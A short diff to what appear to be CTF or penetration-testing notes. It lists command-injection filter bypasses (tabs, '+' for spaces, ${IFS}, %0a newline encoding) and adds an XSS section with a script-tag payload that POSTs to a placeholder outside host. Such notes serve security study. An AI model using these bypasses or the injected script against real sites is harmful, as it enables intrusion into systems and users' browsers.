@@ -19,3 +19,13 @@ Other tricks:
 
  - Whitespaces. Can use tabs if spaces are blocked. URLs take `+` for spaces (eg. `curl+\flag`). `${IFS}` (internal field separator)
  - special characters, such as the list above. URLs can take ascii but with a percentage. eg newline 0x0a --> %0a
+
+### XSS
+Here's a fetch in javascript making a post request
+```js
+<script>
+	const url ="http://somewhere.com";
+	const options = {method:"POST"};
+	fetch(url,options)
+</script>
+```
